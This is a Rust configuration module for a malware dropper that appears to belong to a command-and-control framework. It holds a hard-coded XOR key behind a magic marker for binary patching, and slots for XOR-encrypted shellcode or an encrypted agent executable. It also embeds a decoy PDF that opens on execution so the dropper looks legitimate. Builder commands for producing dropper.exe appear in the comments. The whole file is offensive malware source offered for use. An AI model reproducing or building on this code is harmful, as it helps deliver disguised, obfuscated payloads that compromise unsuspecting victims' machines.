//! Configuration module for the dropper
//!
//! This module supports two modes:
//! 1. SHELLCODE mode: Embedded XOR-encrypted shellcode (requires donut)
//! 2. AGENT mode: Embedded XOR-encrypted agent.exe (simpler, no donut required)
//!
//! The builder will auto-generate this file with the appropriate values.
//!
//! Usage:
//! - Agent mode: ./builder build-dropper --agent agent.exe --output dropper.exe
//! - Shellcode mode: ./builder build-dropper --shellcode shellcode.bin --output dropper.exe

// ============================================================================
// PAYLOAD CONFIGURATION (PATCHABLE)
// ============================================================================
// These values will be replaced by the builder tool
// The magic marker allows binary patching without recompilation

/// Magic marker to locate XOR key in binary
/// Format: "C2R2_DROPPER_XOR_KEY_PLACEHOLDER" (32 bytes) + 32 bytes key = 64 bytes total
#[used]
#[no_mangle]
pub static DROPPER_XOR_KEY_PADDED: [u8; 64] = *b"C2R2_DROPPER_XOR_KEY_PLACEHOLDER\x4a\x8f\x2c\xd1\x73\xb5\x9e\x47\x1a\xf6\x83\x5d\x29\xc4\x67\xab\x3e\x91\xd8\x54\x0c\xe2\x76\xb9\x45\x1f\xa3\x6d\x88\xc0\x52\xf4";

/// Get XOR key for decrypting the payload (after the marker)
pub fn get_xor_key() -> &'static [u8] {
    &DROPPER_XOR_KEY_PADDED[32..]
}

/// Backward compatibility alias
pub const XOR_KEY: &[u8] = &[
    0x4a, 0x8f, 0x2c, 0xd1, 0x73, 0xb5, 0x9e, 0x47, 0x1a, 0xf6, 0x83, 0x5d, 0x29, 0xc4, 0x67, 0xab,
    0x3e, 0x91, 0xd8, 0x54, 0x0c, 0xe2, 0x76, 0xb9, 0x45, 0x1f, 0xa3, 0x6d, 0x88, 0xc0, 0x52, 0xf4,
];

/// XOR-encrypted shellcode (for shellcode mode, optional)
/// This is a placeholder - will be replaced by the builder
pub const ENCRYPTED_SHELLCODE: &[u8] = &[];

/// XOR-encrypted agent executable (for agent mode)
/// This is more reliable than shellcode mode and doesn't require donut
/// Will be populated by the builder tool
pub const ENCRYPTED_AGENT: &[u8] = &[];

/// Agent execution mode flag
/// 0 = shellcode mode, 1 = agent mode
pub const EXECUTION_MODE: u8 = 0;

// ============================================================================
// DECOY DOCUMENT
// ============================================================================

/// Embedded PDF decoy data (minimal valid PDF)
/// This PDF will be opened when the dropper executes to look legitimate
pub const DECOY_PDF_DATA: &[u8] = include_bytes!("decoy.pdf");

// If no decoy.pdf exists at compile time, use empty
// The build process should create a minimal PDF or use a real one
